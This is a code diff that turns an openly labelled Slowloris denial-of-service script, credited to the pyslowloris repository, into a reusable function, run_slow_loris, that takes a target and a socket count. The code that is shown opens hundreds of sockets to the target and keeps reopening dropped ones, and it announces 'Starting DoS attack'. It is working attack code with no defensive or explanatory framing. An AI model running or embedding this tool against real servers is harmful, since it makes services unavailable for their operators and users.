@@ -1,8 +1,6 @@
-#!/usr/bin/env python
+import socket, random, time
 
 # Source: https://github.com/adrianchifor/pyslowloris
-
-import socket, random, time, sys
 
 headers = [
     "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -22,16 +20,10 @@ def setupSocket(ip):
 
     return sock
 
-if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Use it like this: python {} example.com [nbr] (where nbr is the number of sockets, default=500)".format(sys.argv[0]))
-        sys.exit()
+def run_slow_loris(ip: str, nb_sockets: int=500):
+    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, nb_sockets))
 
-    ip = sys.argv[1]
-    count = 500 if len(sys.argv) == 2 else int(sys.argv[2])
-    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
-
-    for _ in range(count):
+    for _ in range(nb_sockets):
         try:
             print("Socket {}".format(_))
             sock = setupSocket(ip)
@@ -49,7 +41,7 @@ if __name__ == "__main__":
             except socket.error:
                 sockets.remove(sock)
 
-        for _ in range(count - len(sockets)):
+        for _ in range(nb_sockets - len(sockets)):
             print("Re-opening closed sockets...")
             try:
                 sock = setupSocket(ip)
